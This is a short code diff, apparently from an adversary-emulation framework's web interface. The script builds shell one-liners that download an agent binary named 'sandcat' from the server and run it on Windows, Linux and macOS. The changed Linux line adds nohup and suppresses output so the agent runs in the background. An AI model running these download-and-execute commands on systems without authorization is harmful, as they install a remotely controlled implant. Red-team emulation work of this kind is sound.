@@ -85,7 +85,7 @@
             } else if(selected_option === 'windows-cmd') {
                 x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group -executors cmd -v;')
             } else if (selected_option === 'linux') {
-                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group -v;');
+                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && nohup /tmp/sandcat-linux -server '+loc+' -group my_group -v >/dev/null 2>&1;');
             } else if (selected_option === 'darwin') {
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
             }
